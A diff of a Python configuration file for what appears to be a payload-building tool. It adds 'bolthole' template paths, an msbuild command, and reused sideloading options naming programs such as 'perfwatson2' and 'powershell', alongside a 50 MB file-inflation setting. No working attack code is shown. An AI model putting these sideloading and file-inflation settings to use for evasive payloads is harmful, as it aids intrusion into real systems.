@@ -8,13 +8,18 @@ BUILD_DIR = "/app/static/build/"
 SRC_TEMPLATE_DIR = "/templates/src"
 BIN_TEMPLATE_DIR = "/templates/bin"
 SIDELOAD_OPTIONS = [
-    "tzsync", 
+    "tzsync",
     "systemhost",
     "perfwatson2",
     "powershell"
 ]
 
 BUILD_CMD = "nuget install Newtonsoft.Json -Version 13.0.3 && msbuild /property:Configuration=Release /property:Platform=x64 /restore"
+
+BOLTHOLE_SRC_TEMPLATE_DIR = "/templates/bolthole/src"
+BOLTHOLE_BIN_TEMPLATE_DIR = "/templates/bolthole/bin/BoltFiles"
+BOLTHOLE_BUILD_CMD = "msbuild /property:Configuration=Release /property:Platform=x64 /restore"
+BOLTHOLE_SIDELOAD_OPTIONS = SIDELOAD_OPTIONS
 DATA_CS_SIZE_IN_MB =  os.getenv("DATA_CS_SIZE_IN_MB") if os.getenv("DATA_CS_SIZE_IN_MB") else 10
 INFLATE_SIZE = 50 * 1024 * 1024; # Inflate file size 
 
